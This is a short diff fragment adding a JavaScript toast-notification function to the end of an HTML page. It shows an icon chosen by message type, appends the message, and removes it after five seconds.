+        function showToast(message, type = "info") {
+            const container = document.getElementById("toast-container");
+            const toast = document.createElement("div");
+            toast.className = `toast ${type}`;
+            
+            let icon = '<i class="fas fa-info-circle"></i>';
+            if (type === "success") icon = '<i class="fas fa-check-circle"></i>';
+            if (type === "error") icon = '<i class="fas fa-exclamation-circle"></i>';
+
+            toast.innerHTML = `${icon} ${message}`;
+            container.appendChild(toast);
+
+            // Supprimer après 5s
+            setTimeout(() => {
+                toast.remove();
+            }, 5000);
+        }
+    </script>
+</body>
+</html>
